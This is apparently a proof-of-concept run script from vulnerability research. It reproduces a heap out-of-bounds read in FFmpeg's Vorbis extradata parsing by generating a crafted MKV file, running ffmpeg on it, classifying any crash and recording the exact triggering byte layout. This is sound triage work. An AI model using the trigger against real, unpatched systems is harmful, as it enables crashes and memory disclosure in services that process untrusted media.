#!/bin/bash
# Run script for VULN 001: Heap OOB Read in oggvorbis_decode_init()
# libavcodec/libvorbisdec.c, lines 54-67

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT="$SCRIPT_DIR/vuln_001_input.mkv"
STATUS_FILE="$SCRIPT_DIR/vuln_001_status.txt"

echo "============================================================"
echo " VULN 001: Heap OOB Read - oggvorbis_decode_init()"
echo " libavcodec/libvorbisdec.c lines 54-67"
echo "============================================================"
echo ""

# Step 1: Generate the malicious input
echo "[*] Step 1: Generating malicious MKV input..."
python3 "$SCRIPT_DIR/vuln_001_gen.py"
echo ""

# Verify the file was created
if [ ! -f "$INPUT" ]; then
    echo "[!] ERROR: Failed to generate $INPUT"
    exit 1
fi

# Step 2: Run ffmpeg
echo "[*] Step 2: Running ffmpeg on crafted input..."
echo "    Command: $FFMPEG -i $INPUT -f null -"
echo ""

set +e
FFMPEG_OUTPUT=$("$FFMPEG" -i "$INPUT" -f null - 2>&1)
EXIT_CODE=$?
set -e

echo "$FFMPEG_OUTPUT"
echo ""
echo "[*] ffmpeg exit code: $EXIT_CODE"

# Step 3: Classify result
echo ""
echo "[*] Step 3: Analyzing result..."

# Check for crash signals
if echo "$FFMPEG_OUTPUT" | grep -qiE "Segmentation fault|SIGSEGV|AddressSanitizer|heap-buffer-overflow|stack-buffer-overflow|SIGABRT|Aborted"; then
    RESULT="CRASH"
    NOTES="ffmpeg crashed - vulnerability triggered"
elif [ $EXIT_CODE -ne 0 ]; then
    RESULT="ERROR"
    NOTES="ffmpeg exited with non-zero code $EXIT_CODE - possible partial trigger or guard hit"
else
    RESULT="NO_CRASH"
    NOTES="ffmpeg exited cleanly - OOB may have occurred silently or was suppressed"
fi

echo "[*] Result: $RESULT"
echo "[*] Notes : $NOTES"

# Step 4: Write status file
cat > "$STATUS_FILE" << EOF
VULN_ID: VULN_001
TITLE: Heap OOB Read via bytestream_get_be16 in oggvorbis_decode_init()
FILE: libavcodec/libvorbisdec.c (lines 54-67)
CWE: CWE-125 (Out-of-bounds Read)
INPUT: vuln_001_input.mkv
RESULT: $RESULT
EXIT_CODE: $EXIT_CODE
NOTES: $NOTES

TRIGGER SUMMARY:
  Container : MKV (Matroska) with A_VORBIS codec
  CodecPrivate (extradata, 34 bytes):
    [0x00, 0x1E, <30 bytes filler>, 0x00, 0x00]
  Path:
    p[0]==0 && p[1]==30 → enter branch
    i=0: hsizes[0]=bytestream_get_be16=0x001E=30; sizesum=32; OK; p→+32
    i=1: hsizes[1]=bytestream_get_be16=0x0000=0;  sizesum=34; 34>34 false; OK; p→+34
    i=2: bytestream_get_be16 reads extradata[34..35] → OOB (extradata_size=34)

FFMPEG OUTPUT (truncated):
$(echo "$FFMPEG_OUTPUT" | head -40)
EOF

echo ""
echo "[*] Status written to: $STATUS_FILE"
echo "============================================================"
